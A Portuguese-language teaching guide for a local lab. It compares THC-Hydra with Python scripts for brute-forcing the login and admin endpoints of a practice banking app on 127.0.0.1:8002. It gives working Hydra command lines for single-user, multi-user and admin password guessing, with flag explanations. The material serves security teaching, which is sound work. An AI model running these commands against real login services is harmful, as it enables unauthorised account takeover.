# Guia Prático: Hydra vs Python no Brute Force

**Laboratório:** NexusBank `/login` e `/admin/login` (porta `8002`)
**Ferramenta:** THC-Hydra (Kali) vs `bruteforce_*.py`
**Apoio:** `comandos_hydra.sh`, `comparar_tempo.py`

---

> ⚠️ Hydra envia `application/x-www-form-urlencoded` por padrão; nossa API espera **JSON**. Isso já é metade da aula (ver §3).

## 1. Hydra em 1 comando (Nível 01)

```bash
# Sintaxe: hydra -l <user> -P <wordlist> <alvo> -s <porta> http-post-form "<rota>:<body>:<condição de falha>"
hydra -l ana -P senhas.txt 127.0.0.1 -s 8002 \
  http-post-form "/login:usuario=^USER^&senha=^PASS^:F=401" -t 4 -V
```

| Trecho | Significado |
| :--- | :--- |
| `-l ana` | Usuário fixo (Nível 01). |
| `-P senhas.txt` | Wordlist (uma por linha). |
| `http-post-form` | Módulo de formulário HTTP. |
| `^USER^/^PASS^` | Placeholders que o Hydra substitui. |
| `F=401` | Falha = status 401 (sucesso = qualquer outro, aqui `200`). Alternativa: `S=200`. |
| `-t 4` | 4 threads. `-V` verbose. |

**Saída esperada:** `[8002][http-post-form] host: 127.0.0.1 login: ana password: 123456`.

## 2. Nível 02 (múltiplos usuários) e admin

```bash
# Vários usuários:
hydra -L usuarios.txt -P senhas.txt 127.0.0.1 -s 8002 \
  http-post-form "/login:usuario=^USER^&senha=^PASS^:F=401" -t 4

# Rota admin (RBAC):
hydra -l admin -P senhas.txt 127.0.0.1 -s 8002 \
  http-post-form "/admin/login:usuario=^USER^&senha=^PASS^:F=401" -t 4 -V
```

## 3. O Porquê do JSON (comparação honesta)

Nossa API valida `request.json()`. Hydra manda `usuario=ana&senha=123` como form → servidor pode responder `422`. Opções de aula:

1. **Adaptar o lab:** aceitar form + JSON no backend (1 `if` no professor) — aí Hydra funciona 100%.
2. **Manter JSON puro:** Hydra falha, Python passa — prova que **ferramenta pronta ≠ universal**.
3. **Meio-termo (recomendado):** mostre Hydra contra endpoint form de exemplo + Python contra JSON, e compare.

## 4. Hydra vs Python (tabela para slide)

| Critério | Hydra | Python (`requests`) |
| :--- | :--- | :--- |
| Linhas para lançar | 1 comando | ~25 linhas |
| Velocidade | Alta (`-t 16/32`) | Baixa (sequencial, dá para paralelizar) |
| JSON nativo | Não (form) | Sim (`json=`) |
| 2 arquivos (user×pass) | Sim (`-L/-P`) | Sim (laço aninhado) |
| Métricas/relatório CSV | Log texto | Total controle (`time`, `csv`, `auditoria.log`) |
| Erro `403` vs `401` | Precisa `F=`/`S=` bem calibrado | `if/elif` explícito |
| Didática de protocolo | Esconde | Mostra (`status_code`, `strip`, `break`) |

> 💡 **Conclusão de aula:** Hydra ganha em velocidade de lançamento; Python ganha em controle e explicação. Blue Team vê os dois do mesmo jeito (rajada de `401`).

---

## 5. Anexo A — Docker por Aluno e Concorrência

Cada aluno ataca o próprio `docker compose` em `127.0.0.1:8002`; o Hydra de um não encosta no outro porque o alvo é o loopback/bridge local. Se a sala quiser um ranking (quem acha primeiro), cada `time hydra ...` mede só contra a própria máquina — sem disputa de porta. Para simular “servidor central”, o professor pode expor 1 IP e pedir `hydra <IP-professor>` com `-t 4` baixo para não derrubar o lab.
